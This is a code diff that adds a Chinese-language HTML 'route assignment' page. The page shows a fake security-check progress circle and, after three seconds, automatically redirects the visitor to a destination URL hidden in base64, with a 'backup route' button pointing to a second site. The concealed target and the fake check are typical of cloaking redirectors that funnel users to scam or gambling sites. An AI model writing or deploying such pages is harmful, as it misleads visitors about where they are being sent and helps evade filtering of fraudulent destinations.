@@ -1,0 +1,150 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>分配线路中...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background: #e9eef1;
+      font-family: "Microsoft YaHei", sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      width: 300px;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    }
+
+    .progress-circle {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 20px;
+    }
+
+    .progress-circle svg {
+      transform: rotate(-90deg);
+    }
+
+    .progress-circle circle {
+      fill: none;
+      stroke-width: 10;
+      stroke-linecap: round;
+    }
+
+    .progress-bg {
+      stroke: #eee;
+    }
+
+    .progress-bar {
+      stroke: #ff5e5e;
+      stroke-dasharray: 314; /* 2πr ≈ 3.14*100 */
+      stroke-dashoffset: 314;
+      transition: stroke-dashoffset 0.3s linear;
+    }
+
+    .progress-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .title {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .tip {
+      color: green;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      padding: 12px 20px;
+      background: #ff5e5e;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #ff4242;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="progress-circle">
+      <svg width="120" height="120">
+        <circle class="progress-bg" cx="60" cy="60" r="50" />
+        <circle class="progress-bar" cx="60" cy="60" r="50" />
+      </svg>
+      <div class="progress-text" id="progressText">0</div>
+    </div>
+    <div class="title">分配线路中</div>
+    <div class="tip">可以进入安全检测<br>请点击</div>
+    <button class="btn" onclick="jump()">立即进入</button>
+<button class="btn" onclick="jump2()">备用线路</button>
+  </div>
+
+  <script>
+    const encodedUrl = "aHR0cHM6Ly8wMTQ5MjI5LmNvbQ=="; // 目标地址 base64 编码
+    const totalTime = 3000; // 总时间（毫秒）
+    const interval = 30;    // 更新频率（毫秒）
+    const steps = totalTime / interval;
+    const circle = document.querySelector(".progress-bar");
+    const text = document.getElementById("progressText");
+
+    let current = 0;
+
+    const updateProgress = setInterval(() => {
+      current++;
+      let percent = Math.floor((current / steps) * 100);
+      let offset = 314 - (314 * percent / 100);
+      circle.style.strokeDashoffset = offset;
+      text.textContent = percent;
+
+      if (current >= steps) {
+        clearInterval(updateProgress);
+        jump();
+      }
+    }, interval);
+
+
+function jump() {
+    const decodedUrl = atob(encodedUrl); // 解码目标地址
+    window.location.href = decodedUrl;   // 跳转
+  }
+
+
+
+
+
+
+
+
+    function jump2() {
+      window.location.href = "https://liushudh.pages.dev/";
+    }
+  </script>
+
+</body>
+</html>
